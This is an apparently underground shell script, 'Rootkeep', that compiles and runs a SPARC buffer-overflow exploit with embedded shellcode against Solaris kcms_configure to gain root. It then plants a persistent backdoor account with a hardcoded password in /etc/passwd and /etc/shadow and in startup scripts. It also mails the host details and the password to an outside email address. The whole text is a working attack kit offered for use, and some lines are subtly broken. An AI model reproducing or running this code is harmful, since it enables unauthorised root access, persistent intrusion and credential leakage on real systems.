################################################
#
# !/bin/sh
# Rootkeep version *somefin_r33t_goes_here*
# Gain root via kcms.. Follow instructions and
# script will ensure an instant backdoor every
# reboot. Fscking Solaris start-up scripts suck
# Code for KCMS was chopped up by Shadow Pengiun
# Society
# @rwxr--r-- #unixgods (efnet)
#
################################################

cat > kcms.c << EOF

#define ENV         "NETPATH="
#define MAXBUF      3000
#define RETADR      2116
#define RETOFS      0x1300
#define EXPADR      1200
#define FAKEADR1    2092
#define FAKEADR2    2112
#define NOP         0xa61cc013

char exploit_code[] =
"\x82\x10\x20\x17\x91\xd0\x20\x08"
"\x82\x10\x20\xca\xa6\x1c\xc0\x13\x90\x0c\xc0\x13\x92\x0c\xc0\x13"
"\xa6\x04\xe0\x01\x91\xd4\xff\xff\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e"
"\x2f\x0b\xdc\xda\x90\x0b\x80\x0e\x92\x03\xa0\x08\x94\x1a\x80\x0a"
"\x9c\x03\xa0\x10\xec\x3b\xbf\xf0\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
"\x82\x10\x20\x3b\x91\xd4\xff\xff";

unsigned long get_sp(void)
{
__asm__("mov %sp,%i0 \n");
}

main()
{
    char            buf[MAXBUF];
    unsigned int    i,ip,sp;

    putenv("LANG=");
    sp=get_sp();
    printf("ESP =0x%x\n",sp);

    for (i=0;i<MAXBUF-4;i+=4){
        buf[i+3]=NOP&0xff;
        buf[i+2]=(NOP>>8)&0xff;
        buf[i+1]=(NOP>>16)&0xff;
        buf[i  ]=(NOP>>24)&0xff;
    }

    ip=sp;
    printf("FAKE=0x%x\n",sp);
    buf[FAKEADR1+3]=ip&0xff;
    buf[FAKEADR1+2]=(ip>>8)&0xff;
    buf[FAKEADR1+1]=(ip>>16)&0xff;
    buf[FAKEADR1  ]=(ip>>24)&0xff;
    buf[FAKEADR2+3]=ip&0xff;
    buf[FAKEADR2+2]=(ip>>8)&0xff;
    buf[FAKEADR2+1]=(ip>>16)&0xff;
    buf[FAKEADR2  ]=(ip>>24)&0xff;

    ip=sp-RETOFS;
    printf("EIP =0x%x\n",sp);
    buf[RETADR+3]=ip&0xff;
    buf[RETADR+2]=(ip>>8)&0xff;
    buf[RETADR+1]=(ip>>16)&0xff;
    buf[RETADR]=(ip>>24)&0xff;

    strncpy(buf+EXPADR,exploit_code,strlen(exploit_code));

    strncpy(buf,ENV,strlen(ENV));
    buf[MAXBUF-1]=0;
    putenv(buf);

    execl("/usr/openwin/bin/kcms_configure","kcms_configure","1",0);
}

EOF

echo "Please wait"
gcc kcms.c -o /usr/dt/examples/dtdnd
chmod +x /usr/dt/examples/dtdnd

# This retains your root shell by piecing
# echo'd predefined user and password into
# separate Solaris start up scripts which
# we all know are a nightmare...

cat > dtwsm << EOF

#!/bin/sh
# rootkeep v.1
# sil@antioffline.com

USER="dtserver:x:2012:2012::/usr/dt:/bin/sh"
MAIL="intrusion@engineer.com"
PATH=/usr/dt/examples
FILE1=/etc/rc2.d/K40syslog
FILE2=/usr/platform/sun4u/lib/flash-update.sh
HOST=ifconfig -a
PASS=/etc/passwd
SHAD=/etc/shadow
STRN="dtserver:uFBzOiICo3deU:11107:7:91:28:::"
# string equates to p4$sW3rD
WORD="p4$sW3rD"
if test -n grep dtserver $PASS

	then echo $HOST is already backdoored >> /usr/dt/examples/dtinfo;
	mail -s dtserver $MAIL < /usr/dt/examples/dtinfo;
else

	echo $USER >> $PASS;
	echo $STRN >> $SHAD;
	mail -s dtserver MAIL < /usr/dt/examples/dtinfo

fi

if test -n grep $STRN $SHAD

then echo Password is set to $WORD | mail -s dtserver $MAIL

else
	echo "echo dtserver:x:2012:2012::/usr/dt:/bin/sh" >> $FILE1;
	echo "echo dtserver:uFBzOiICo3deU:11107:7:91:28:::" >> $FILE2;
	mail -s dtsrm -f /usr/dt/example/dtd

fi
EOF

chmod +x dtdnd
mv dtdnd /usr/dt
/usr/dt/examples/./dtdnd

echo "Now type /usr/dt/examples/./dtwsm and your set...."
